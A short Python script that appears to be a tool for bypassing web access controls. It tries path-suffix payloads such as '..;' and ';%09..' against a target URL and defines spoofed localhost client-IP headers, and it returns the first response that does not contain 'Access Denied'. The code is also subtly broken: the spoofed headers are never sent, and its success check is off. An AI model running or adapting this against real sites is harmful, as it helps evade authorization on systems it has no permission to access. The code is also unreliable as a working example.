import requests
from fake_useragent import UserAgent

class Bypass:
    def __init__(self) -> None:
        self.session = requests.Session()
        self.ua = UserAgent(browsers=['edge', 'chrome'])
        self.user_agent = self.ua.random
        self.headers = {
            "Client-IP": "127.0.0.1",
            "X-Real-Ip": "127.0.0.1",
            "Redirect": "127.0.0.1",
            "Referer": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Forwarded-By": "127.0.0.1",
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Forwarded-Port": "80",
            "X-True-IP": "127.0.0.1",
            "user-agent": self.user_agent}

        self.payloads = ["%09",
            "%20",
            "%23",
            "%2e",
            "%2f",
            ".",
            ";",
            "..;",
            ";%09",
            ";%09..",
            ";%09..;",
            ";%2f..",
            "*"]
    def get(self, URL = None, allow_redirect= False):
        for p in self.payloads:
            req = self.session.get(f"{URL}{p}", allow_redirects=allow_redirect)
            if req.text.find('Access Denied') <= 0:
                return req.text
            else:
                continue